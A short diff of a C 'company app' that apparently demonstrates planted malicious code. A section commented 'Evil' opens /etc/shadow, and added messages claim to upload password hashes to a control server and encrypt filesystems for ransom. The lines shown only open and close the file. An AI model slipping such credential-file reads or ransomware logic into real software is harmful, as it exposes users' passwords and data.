@@ -6,6 +6,7 @@ int main()
    printf("Company app is running\n");
  
    // Evil
+   printf("Uploading password hashes to control server\n");
    char *filename = "/etc/shadow";
    FILE *fp = fopen(filename, "r");
 
@@ -17,7 +18,7 @@ int main()
 
    // close the file
    fclose(fp);
-   printf("Ran evil code\n");
+   printf("Hashes uploaded. Now encrypting filesystems and setting MOTD to display ransome\n");
    
    return(0);
 
